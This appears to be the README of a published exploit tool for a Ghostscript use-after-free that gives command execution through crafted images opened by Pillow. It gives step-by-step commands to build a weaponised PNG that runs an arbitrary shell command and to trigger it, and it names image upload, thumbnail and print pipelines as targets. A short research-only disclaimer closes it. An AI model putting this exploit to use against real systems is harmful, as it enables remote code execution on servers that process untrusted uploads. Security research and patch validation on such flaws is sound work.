# CVE-2026-125396 Fuzz Bomb Exploit

[English](README_EN.md) | [中文](README.md)

**Referer**: https://pwn.ai/upload2shell/research.html

**Scope**: Ghostscript < 10.08.0

A fuzzing-enabled upload2shell variant for 64-bit LP64; other architectures are
not covered.

## TL;DR

This is a logical UAF. The UAF stage is address-independent: the payload uses a
marker scan instead of guessing heap addresses, so a single prebuilt fuzz image
can exercise many builds at once. The native RCE stage still depends on
build-specific pointer offsets and heap phase, so validate each target. This is
closer to the intended upload2shell concept.

In the spirit of Log4j-style parser gadgets: image/document uploads, thumbnails,
print jobs, and preview/import pipelines that pass untrusted bytes to
Ghostscript are the test surfaces.

## Quick Start

```bash
# Generate the fuzz image: --cmd sets the %pipe% command; quoting prevents the shell from treating > as redirection
python3 exp.py --cmd 'id>/tmp/PWN' --out /tmp/exp.png

# Load and trigger
echo 'from PIL import Image
with Image.open("/tmp/exp.png") as image:
    image.load()' | python3

cat /tmp/PWN
# uid=1000(debian) gid=1000(debian) ...
```

Pillow's EPS plugin invokes `gs` with `-dSAFER`. Because the payload writes
`/tmp/PWN` and then `quit`s, `image.load()` may raise
`UnidentifiedImageError`; `cat /tmp/PWN` still reads the `id` artifact.

---

**Authorized for technical research only. The author assumes no responsibility for any consequences.**
